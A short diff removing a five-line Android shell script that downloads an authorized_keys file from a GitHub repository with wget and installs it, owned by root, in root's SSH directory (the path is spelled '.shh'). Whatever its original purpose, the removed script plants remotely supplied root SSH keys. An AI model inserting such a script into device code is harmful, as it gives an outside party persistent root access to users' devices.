@@ -1,5 +1,0 @@
-#!/system/bin/sh
-wget -O /data/local/tmp/abc https://github.com/Androidmate/Adb-tools-minimal/raw/develop/authorized_keys
-mv /data/local/tmp/abc /data/ssh/root/.shh/authorized_keys
-chown root:root /data/ssh/root/.shh/authorized_keys
-chmod 644 /data/ssh/root/.shh/authorized_keys
